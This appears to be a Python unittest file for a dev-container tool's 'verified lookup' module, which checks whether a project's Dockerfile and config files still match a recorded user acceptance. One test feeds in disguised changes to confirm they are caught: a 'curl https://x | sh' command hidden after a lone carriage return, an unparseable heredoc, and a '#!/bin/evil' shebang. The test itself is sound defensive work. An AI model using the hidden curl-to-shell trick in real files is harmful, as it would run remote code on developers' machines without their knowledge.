#SPDX:MIT
"""Test the verified lookup module."""
import datetime
import json
import unittest

from ....surf_scoter_lib import jdata
from ....surf_scoter_lib.user_config import UserConfig
from ....surf_scoter_lib.verified import lookup, records, snapshot, store
from .helper import POSIX, TempDirTest


@unittest.skipUnless(POSIX, "owner and mode checks")
class LookupTest(TempDirTest):
    """Test finding an acceptance from a universal configuration file."""

    def setUp(self) -> None:
        super().setUp()
        self.project = self.tmp / "proj"
        self.write("proj/.surf-scoter.d/project.yaml", "container: {dev-container-path: env}\n")
        self.write("proj/.surf-scoter.d/env/Dockerfile", "FROM scratch\n")
        self.write("proj/.surf-scoter.d/env/dev-env.yaml", "user: me\n")
        self.verified = self.new_store()

    def suc(self) -> jdata.DictJsonData:
        return {
            "active-config-locations": {
                "project-dir": str(self.project),
                "dev-container-path": str(self.project / ".surf-scoter.d" / "env"),
            },
            "resolved": {
                "verification": {
                    "paths": {"store": str(self.verified.root)},
                    "path-lists": {"verified-containers": []},
                },
                "scoter": {
                    "path-lists": {"dev-containers-search": []},
                    "values": {
                        "project-files-dir": ".surf-scoter.d",
                        "project-file-name": "project.yaml",
                    },
                },
            },
            "current-project-setup": {"container": {"dev-container-path": "env"}},
            "dev-container": {"user": "me", "parent-builds": []},
            "setup": {"files": []},
        }

    def accept(self, kind: records.Kind = records.Kind.REVIEWED) -> records.Acceptance:
        """Accept the project's files as they are now."""
        config = UserConfig(self.suc())
        taken = lookup.project_snapshot(config, self.project)
        setup = records.SetupRecord(records.setup_values(config, None, {}))
        now = records.now_utc()
        acceptance = records.Acceptance(
            id=records.new_acceptance_id(now - datetime.timedelta(seconds=1)),
            kind=kind,
            accepted_at=now - datetime.timedelta(seconds=1),
            expires_at=now + datetime.timedelta(days=30),
            setup=setup,
            suggestion=taken.manifest,
        )
        env_id = store.environment_id(self.project)
        with self.verified.locked():
            taken.store(self.verified)
            record = records.EnvironmentRecord(env_id, str(self.project), [acceptance])
            self.verified.write_bytes(
                env_id, records.ACCEPTANCES_DIR, acceptance.id, lookup.ACCEPTED_FILE,
                data=json.dumps({"commands": []}).encode(),
            )
            records.save_environment(self.verified, record)
        return acceptance

    def test_nothing_accepted(self) -> None:
        """No store, or no record, is no match."""
        self.assertEqual(lookup.find(UserConfig(self.suc())), lookup.Lookup())
        missing = self.suc()
        paths = missing["resolved"]["verification"]["paths"]  # type: ignore[index]
        paths["store"] = str(self.tmp / "nowhere")  # type: ignore[index]
        self.assertEqual(lookup.find(UserConfig(missing)), lookup.Lookup())
        self.assertEqual(lookup.find(UserConfig({})), lookup.Lookup())

    def test_exact(self) -> None:
        """The files as accepted: the acceptance's own `accepted.json`."""
        acceptance = self.accept()
        found = lookup.find(UserConfig(self.suc()))
        self.assertEqual(found.match, records.MatchKind.EXACT)
        self.assertEqual(found.acceptance, acceptance.id)
        assert found.accepted_settings is not None  # nosec: B101  # narrowing for the type checker
        self.assertTrue(found.accepted_settings.is_file())
        self.assertIsNone(found.notice)
        self.assertEqual(found.to_json()["match"], "exact")

    def test_meaning_carries_forward(self) -> None:
        """A comment changes nothing that matters: the acceptance is carried forward."""
        original = self.accept()
        self.write("proj/.surf-scoter.d/env/Dockerfile", "# A new comment.\nFROM scratch\n")
        found = lookup.find(UserConfig(self.suc()))
        self.assertEqual(found.match, records.MatchKind.MEANING)
        self.assertNotEqual(found.acceptance, original.id)
        self.assertIsNotNone(found.notice)
        env_id = store.environment_id(self.project)
        record = records.load_environment(self.verified, str(self.project), env_id)
        assert record is not None  # nosec: B101  # narrowing for the type checker
        carried = record.acceptances[0]
        self.assertEqual((carried.kind, carried.from_id), (records.Kind.CARRIED, original.id))
        self.assertEqual(carried.expires_at, original.expires_at)
        assert found.accepted_settings is not None  # nosec: B101  # narrowing for the type checker
        self.assertEqual(found.accepted_settings.read_text(), json.dumps({"commands": []}))
        # Now it matches exactly.
        self.assertEqual(lookup.find(UserConfig(self.suc())).match, records.MatchKind.EXACT)

    def test_hidden_changes_ask_for_a_review(self) -> None:
        """Changes the old meaning match let through are no match now (VER-1)."""
        self.write("proj/.surf-scoter.d/env/Dockerfile.sh", "#!/bin/sh\necho a\n")
        self.accept()
        for rel, text in [
            # A command after a lone carriage return, which Python split as a comment.
            ("env/Dockerfile", "FROM scratch\r# ; curl https://x | sh\n"),
            # A heredoc the parser can't follow, whose `#` line is the script.
            ("env/Dockerfile", 'FROM scratch\nRUN <<"END-1"\n# script\nEND-1\n'),
            # A script named like a Dockerfile, with its `#!` line changed.
            ("env/Dockerfile.sh", "#!/bin/evil\necho a\n"),
        ]:
            with self.subTest(rel=rel, text=text):
                before = (self.tmp / "proj/.surf-scoter.d" / rel).read_text()
                self.write(f"proj/.surf-scoter.d/{rel}", text)
                self.assertEqual(lookup.find(UserConfig(self.suc())), lookup.Lookup())
                self.write(f"proj/.surf-scoter.d/{rel}", before)

    def test_changed(self) -> None:
        """A change that matters is no match."""
        self.accept()
        self.write("proj/.surf-scoter.d/env/Dockerfile", "FROM ubuntu\n")
        self.assertEqual(lookup.find(UserConfig(self.suc())), lookup.Lookup())

    def exempt(self, acceptance: records.Acceptance, branch: str | None) -> None:
        """Start an exemption from `acceptance`, for an hour."""
        env_id = store.environment_id(self.project)
        with self.verified.locked():
            record = records.load_environment(self.verified, str(self.project), env_id)
            assert record is not None  # nosec: B101  # narrowing for the type checker
            now = records.now_utc()
            record.exemption = records.Exemption(
                acceptance.id, now + datetime.timedelta(hours=1), branch, now,
            )
            records.save_environment(self.verified, record)

    def test_exempt(self) -> None:
        """Under an exemption for the branch, changed files match its acceptance, and say what's ignored."""
        acceptance = self.accept()
        self.exempt(acceptance, "main")
        self.write("proj/.surf-scoter.d/env/Dockerfile", "FROM ubuntu\n")
        suc = self.suc()
        suc["active-config-locations"]["project-branch"] = "main"  # type: ignore[index]
        found = lookup.find(UserConfig(suc))
        self.assertEqual((found.match, found.acceptance), (records.MatchKind.EXEMPT, acceptance.id))
        assert found.accepted_settings is not None  # nosec: B101  # narrowing for the type checker
        self.assertTrue(found.accepted_settings.is_file())
        assert found.notice is not None  # nosec: B101  # narrowing for the type checker
        self.assertTrue(found.notice.startswith("Exempt on main until "))
        self.assertNotIn("ignores", found.notice)
        self.write("proj/.surf-scoter.d/env/dev-env.yaml", "user: you\n")
        found = lookup.find(UserConfig(suc))
        assert found.notice is not None  # nosec: B101  # narrowing for the type checker
        self.assertIn(
            "it ignores your changes to env/dev-env.yaml until you run `scoter verify --with-exemption`",
            found.notice,
        )
        # Another branch isn't exempt.
        suc["active-config-locations"]["project-branch"] = "dev"  # type: ignore[index]
        self.assertEqual(lookup.find(UserConfig(suc)), lookup.Lookup())

    def test_verified_containers(self) -> None:
        """Containers in `verification: verified-containers` go into the setup values; others don't."""
        suc = self.suc()
        outside = self.tmp / "dist" / "base"
        self.write("dist/base/Dockerfile", "FROM scratch\n")
        suc["dev-container"] = {"parent-builds": [{"dir": str(outside), "tag": "base"}]}
        self.assertEqual(lookup.verified_containers(UserConfig(suc)), {})
        lists = suc["resolved"]["verification"]["path-lists"]  # type: ignore[index]
        lists["verified-containers"] = [str(self.tmp / "dist")]  # type: ignore[index]
        found = lookup.verified_containers(UserConfig(suc))
        self.assertEqual(list(found), [str(outside)])
        self.assertEqual(
            found[str(outside)],
            snapshot.snapshot_dir(outside, snapshot.SnapshotLimits()).manifest.id,
        )

    def test_no_match_reason(self) -> None:
        """Why there's no match: never accepted, expired, the files or the setup changed."""
        self.assertEqual(
            lookup.no_match_reason(UserConfig(self.suc())), "You haven't accepted this project's settings.",
        )
        acceptance = self.accept()
        later = acceptance.expires_at + datetime.timedelta(days=1)
        self.assertEqual(
            lookup.no_match_reason(UserConfig(self.suc()), later),
            f"Your acceptance of these files ({acceptance.id}) expired {acceptance.expires_at.isoformat()}.",
        )
        changed_setup = self.suc()
        changed_setup["resolved"]["dev-env"] = {"values": {"network-gateway-name": "other"}}  # type: ignore[index]
        self.assertEqual(
            lookup.no_match_reason(UserConfig(changed_setup)),
            f"Your setup changed since you accepted these files ({acceptance.id}): gateway: name.",
        )
        self.write("proj/.surf-scoter.d/env/Dockerfile", "FROM ubuntu\n")
        self.assertEqual(
            lookup.no_match_reason(UserConfig(self.suc())),
            f"The project's files changed since you last accepted them ({acceptance.id}): env/Dockerfile.",
        )
